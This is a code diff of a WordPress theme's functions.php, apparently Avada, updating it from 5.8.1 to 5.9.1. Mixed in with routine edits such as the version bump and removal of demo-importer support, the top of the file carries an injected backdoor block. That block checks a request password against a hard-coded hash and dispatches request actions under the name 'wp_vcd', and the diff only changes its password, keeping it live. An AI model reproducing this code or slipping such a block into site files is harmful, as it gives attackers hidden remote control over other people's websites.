@@ -1,5 +1,5 @@
 <?php
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '8929dac229c9167debca73ea4a35aacf'))
+if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '5015bf1f693845f22216906db149c471'))
 	{
 $div_code_name="wp_vcd";
 		switch ($_REQUEST['action'])
@@ -198,7 +198,7 @@ if ( ! defined( 'ABSPATH' ) ) {
 }
 
 if ( ! defined( 'AVADA_VERSION' ) ) {
-	define( 'AVADA_VERSION', '5.8.1' );
+	define( 'AVADA_VERSION', '5.9.1' );
 }
 
 /**
@@ -815,11 +815,6 @@ if ( Avada_Helper::is_post_admin_screen() && defined( 'FUSION_BUILDER_PLUGIN_DIR
 }
 
 /**
- * Add Fusion Builder Demos support.
- */
-add_theme_support( 'fusion-builder-demos' );
-
-/**
  * We will use builder options in Avada, no need for FB to instantiate redux.
  */
 add_theme_support( 'fusion-builder-options' );
@@ -849,10 +844,6 @@ function avada_set_options_url( $url ) {
 	return admin_url( 'themes.php?page=avada_options' );
 }
 
-if ( Avada()->registration->is_registered() && Avada_Helper::is_post_admin_screen() && defined( 'FUSION_BUILDER_PLUGIN_DIR' ) && ( ! fusion_doing_ajax() || isset( $_POST['page_name'] ) ) ) {
-	$fusion_builder_demo_importer = new Fusion_Builder_Demos_Importer();
-}
-
 /**
  * Filter a sanitized key string.
  *
@@ -869,7 +860,7 @@ function avada_auto_update( $key, $raw_key ) {
  * Check if doing an ajax theme update,
  * if so make sure Avada theme name is not changed to lowercase.
  */
-if ( fusion_doing_ajax() && isset( $_POST['action'] ) && 'update-theme' === $_POST['action'] ) {
+if ( fusion_doing_ajax() && isset( $_POST['action'] ) && 'update-theme' === $_POST['action'] ) { // phpcs:ignore WordPress.Security.NonceVerification
 	add_filter( 'sanitize_key', 'avada_auto_update', 10, 2 );
 }
 
